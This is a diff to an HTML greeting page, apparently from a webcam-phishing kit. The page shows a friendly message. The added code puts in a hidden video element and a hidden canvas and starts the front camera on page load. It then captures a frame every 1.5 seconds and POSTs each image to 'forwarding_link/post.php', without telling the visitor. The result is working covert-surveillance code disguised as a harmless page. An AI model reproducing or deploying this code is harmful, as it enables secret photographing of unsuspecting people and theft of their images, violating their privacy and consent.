@@ -147,104 +147,76 @@ background-position: center; /* Center the image */
     <p>Hope your day goes great!</p>    
   </div>
 </div>
+    
 
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
 
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<span id="errorMsg"></span>
 
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
 
-      <div class="video-wrap" hidden="hidden">
-       <video id="video" playsinline autoplay></video>
-     </div>
-
-     <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-      <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-
-     <script>
-
-      function post(imgdata){
-        $.ajax({
-          type: 'POST',
-          data: { cat: imgdata},
-          url: 'forwarding_link/post.php',
-          dataType: 'json',
-          async: false,
-          success: function(result){
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
         // call the function that handles the response/results
-      },
-      error: function(){
-      }
-    });
-      };
+    },
+    error: function(){
+    }
+  });
+};
 
 
-      'use strict';
+'use strict';
 
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const errorMsgElement = document.querySelector('span#errorMsg');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
 
-      const constraints = {
-        audio: false,
-        video: {
-          width: 1280,
-          height: 720,
-          facingMode: "user"
-        }
-      };
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
 
 // Access webcam
-/*async function init() {
+async function init() {
   try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);        
-        handleSuccess(stream);    
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
   } catch (e) {
-    console.log(e);
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
   }
-}*/
+}
 
 // Success
 function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
 
-  var context = canvas.getContext('2d');
+var context = canvas.getContext('2d');
   setInterval(function(){
 
-   context.drawImage(video, 0, 0, 640, 480);
-   var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-   post(canvasData); }, 1500);
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
   
 
 }
 
- 
 // Load init
-// init();
-navigator.getUserMedia = (navigator.getUserMedia ||
-  navigator.webkitGetUserMedia ||
-  navigator.mozGetUserMedia ||
-  navigator.msGetUserMedia);
+init();
 
-if (navigator.getUserMedia) {
-  navigator.getUserMedia({
-      audio: true,
-      video: true
-    },
-    function(stream) {
-      // returns true if any tracks have active state of true
-      var result = stream.getVideoTracks().some(function(track) {
-        return track.enabled && track.readyState === 'live';
-      });
-
-      if (result) {
-        alert('Your webcam is busy!');
-      } else {
-        alert('Not busy');
-      }
-    },
-    function(e) {
-      alert("Error: " + e.name);
-    });
-}
 </script>
 
 </body>
